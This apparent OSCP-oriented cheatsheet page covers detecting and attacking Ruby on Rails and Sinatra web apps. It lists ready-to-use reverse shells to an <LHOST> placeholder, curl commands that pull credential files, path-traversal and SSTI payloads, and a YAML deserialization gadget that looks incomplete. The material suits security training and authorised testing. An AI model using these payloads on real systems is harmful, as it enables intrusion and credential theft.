# Ruby (Ruby on Rails / Sinatra)

> Part of [03 Languages](../README.md) in the [Web Application Testing Cheatsheet](../../README.md).

**Contents:**

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Known CVEs](#3-known-cves)
- [4. Exploitation patterns](#4-exploitation-patterns)
- [5. Framework-specific](#5-framework-specific)
- [6. Post-exploitation](#6-post-exploitation)
- [7. OSCP notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### 1.1 Headers and cookies

| Header / cookie | Indicates |
|-----------------|-----------|
| `Server: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)` | WEBrick (dev server, version visible) |
| `Server: Puma` | Puma (production Ruby server) |
| `Server: Unicorn` | Unicorn |
| `Server: Passenger` | Phusion Passenger |
| `X-Powered-By: Phusion Passenger` | Passenger |
| `Set-Cookie: _<APPNAME>_session=...` | Rails session |
| `X-Runtime: 0.123456` | Rails (in dev mode) |
| `X-Request-Id` | Rails (middleware) |

### 1.2 Error messages

| Error text | Framework |
|------------|-----------|
| `Webconsole` | Rails dev mode (interactive console in error page!) |
| `ActionController::RoutingError` | Rails |
| `ActiveRecord::RecordNotFound` | Rails (ActiveRecord) |
| `NoMethodError` | Ruby |
| `NameError` | Ruby |
| `Sinatra doesn't know this ditty` | Sinatra (default 404) |
| `Template render error` | Sinatra / Rails |

### 1.3 File paths and structure

| Path | Purpose |
|------|---------|
| `/config/routes.rb` | Rails routes |
| `/config/database.yml` | DB creds |
| `/config/secrets.yml` | Rails secret_key_base |
| `/config/credentials.yml.enc` | Encrypted Rails creds |
| `/app/controllers/` | Controllers |
| `/app/models/` | Models |
| `/app/views/` | Views (ERB, Haml, Slim) |
| `/Gemfile`, `/Gemfile.lock` | Dependencies |
| `/public/` | Static files |
| `/tmp/` | Temp (sessions, cache) |

---

## 2. Enumeration

### 2.1 Common files

```bash
curl -s http://<TARGET>/Gemfile
curl -s http://<TARGET>/Gemfile.lock
curl -s http://<TARGET>/config/database.yml
curl -s http://<TARGET>/config/secrets.yml
curl -s http://<TARGET>/config/routes.rb
curl -s http://<TARGET>/.env
```

### 2.2 Rails-specific paths

| Path | Purpose |
|------|---------|
| `/rails/info/routes` | All routes (dev) |
| `/rails/info/properties` | App properties (dev) |
| `/rails/mailers` | Mailer previews (dev) |
| `/sidekiq` | Sidekiq web UI |
| `/admin`, `/administrator` | Admin panels |
| `/assets/` | Sprockets assets |

### 2.3 Version fingerprinting

```bash
curl -sI http://<TARGET>/ | grep -i server
curl -s http://<TARGET>/404 | grep -i "webconsole\|ruby\|rails"
```

### 2.4 Webconsole (Rails dev)

**Critical:** if error page has a `Webconsole` icon (bottom-right), you have a **Ruby REPL** in the browser.

```bash
# Confirm by triggering an error
curl -s http://<TARGET>/nonexistent-xyz
```

> [!IMPORTANT]
> OSCP report: take a screenshot of the Webconsole page (command + output + timestamp).
> This is a direct RCE primitive.

---

## 3. Known CVEs

| CVE | Affected | Impact | NVD |
|-----|----------|--------|-----|
| CVE-2013-0156 | Rails < 3.2.10 | RCE via XML deserialization | https://nvd.nist.gov/vuln/detail/CVE-2013-0156 |
| CVE-2016-0752 | Rails < 4.2.5.1 | Dynamic render path traversal | https://nvd.nist.gov/vuln/detail/CVE-2016-0752 |
| CVE-2018-3760 | Rails < 5.2.0 | Path traversal in Sprockets | https://nvd.nist.gov/vuln/detail/CVE-2018-3760 |
| CVE-2019-5418 | Rails < 5.2.2.1 | File read via Accept header | https://nvd.nist.gov/vuln/detail/CVE-2019-5418 |
| CVE-2019-5420 | Rails < 5.2.2.1 / 6.0.0.beta3 | RCE via secret_key_base | https://nvd.nist.gov/vuln/detail/CVE-2019-5420 |
| CVE-2020-8163 | Rails < 5.2.4.3 | RCE via render file: | https://nvd.nist.gov/vuln/detail/CVE-2020-8163 |
| CVE-2022-32224 | Rails 5.2.8.1 / 6.0.5.1 / 7.0.3.1 | RCE via YAML deserialization | https://nvd.nist.gov/vuln/detail/CVE-2022-32224 |
| CVE-2025-23091 | Rails 7.0.x-8.0.x | Path traversal in static file server | https://nvd.nist.gov/vuln/detail/CVE-2025-23091 |

---

## 4. Exploitation patterns

### 4.1 Rails Webconsole RCE

If dev mode + Webconsole visible:

1. Trigger an error (`/nonexistent`).
2. Click the **Webconsole** icon (bottom-right).
3. In the console, run Ruby:

```ruby
`id`
`bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'`
system("id")
File.read("/etc/passwd")
```

### 4.2 Rails secret_key_base -> RCE (CVE-2019-5420)

If `secret_key_base` leaks (from `config/secrets.yml`, `config/credentials.yml.enc`, or env):

1. Use the leaked key to sign a malicious session cookie or a signed message.
2. Combined with deserialization sinks -> RCE.

**Tools:**

- **rails_secret_key_base** exploit scripts on GitHub.
- **msf** module: `exploit/multi/http/rails_secret_deserialization`

### 4.3 Mass assignment

Rails' `attr_accessible` (removed in Rails 4) or weak strong params allow setting arbitrary columns:

```text
POST /users
user[username]=attacker&user[admin]=true
```

### 4.4 SQL injection (ActiveRecord)

```ruby
# Vulnerable
User.where("name = '#{params[:name]}'")
User.find_by_sql("SELECT * FROM users WHERE name = '#{params[:name]}'")

# Safe
User.where(name: params[:name])
User.where("name = ?", params[:name])
```

### 4.5 YAML deserialization (CVE-2022-32224)

If app uses `YAML.load` on user input (not `safe_load`):

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
      read: 0
      header: "abc"
```

**Tool:** `rails_yaml_deser` (public PoCs) or `msf module`.

### 4.6 Command injection

Common sinks:

```ruby
system(params[:cmd])
`#{params[:cmd]}`
exec(params[:cmd])
IO.popen(params[:cmd])
Open3.capture2(params[:cmd])
%x{#{params[:cmd]}}
```

### 4.7 ERB SSTI

If user input flows into an ERB template:

```text
<%= 7*7 %>
<%= system("id") %>
<%= `id` %>
```

### 4.8 File read via Accept header (CVE-2019-5418)

```bash
curl -H "Accept: ../../../../etc/passwd{{" http://<TARGET>/
```

Response includes the file content (if Rails version vulnerable).

---

## 5. Framework-specific

### 5.1 Ruby on Rails

- `/config/routes.rb` - routes
- `/config/database.yml` - DB creds (often with env vars)
- `/config/secrets.yml` - `secret_key_base`
- `/config/credentials.yml.enc` - encrypted creds (need `master.key`)
- `/app/` - MVC code
- `/rails/info/routes` - dev route list
- `/rails/info/properties` - dev app info

### 5.2 Sinatra

- Single-file apps (`app.rb`)
- `Sinatra doesn't know this ditty` - default 404
- ERB / Haml / Slim templates
- Less structured than Rails

### 5.3 Other Ruby servers

- **WEBrick** - dev only, slow, verbose
- **Puma** - production (multi-threaded)
- **Unicorn** - production (multi-process)
- **Passenger** - Apache/Nginx integration

---

## 6. Post-exploitation

### 6.1 Read config files

```text
/config/database.yml
/config/secrets.yml
/config/credentials.yml.enc
/config/master.key
/config/storage.yml
/config/initializers/*.rb
```

### 6.2 Rails session decode

Rails session cookies are **encrypted + signed** with `secret_key_base`. With the key:

```ruby
# In a Rails console
Rails.application.message_verifier(:signed).verify("<cookie>")
```

Or use **rails-cookie-decryptor** tools.

### 6.3 Ruby reverse shell

```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<LHOST>","<LPORT>");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
```

One-liner (shorter):

```bash
ruby -rsocket -e 'c=TCPSocket.new("<LHOST>","<LPORT>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read};end'
```

---

## 7. OSCP notes

> [!IMPORTANT]
> OSCP report: screenshot the framework fingerprint (Server header, Webconsole icon, Rails error page) that identifies Ruby.

> [!IMPORTANT]
> OSCP report: screenshot the Webconsole RCE or the deserialization payload output.

> [!IMPORTANT]
> OSCP report: screenshot `config/database.yml` or `config/secrets.yml` read (creds, secret_key_base).

---

## 8. References

- Ruby official docs: https://www.ruby-lang.org/en/documentation/
- Rails official docs: https://guides.rubyonrails.org/
- HackTricks - Ruby: https://book.hacktricks.xyz/pentesting-web/deserialization
- PayloadsAllTheThings - Ruby: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Deserialization/Ruby%20Deserialization.md
- CVE-2013-0156: https://nvd.nist.gov/vuln/detail/CVE-2013-0156
- CVE-2016-0752: https://nvd.nist.gov/vuln/detail/CVE-2016-0752
- CVE-2018-3760: https://nvd.nist.gov/vuln/detail/CVE-2018-3760
- CVE-2019-5418: https://nvd.nist.gov/vuln/detail/CVE-2019-5418
- CVE-2019-5420: https://nvd.nist.gov/vuln/detail/CVE-2019-5420
- CVE-2020-8163: https://nvd.nist.gov/vuln/detail/CVE-2020-8163
- CVE-2022-32224: https://nvd.nist.gov/vuln/detail/CVE-2022-32224
- CVE-2025-23091: https://nvd.nist.gov/vuln/detail/CVE-2025-23091

---
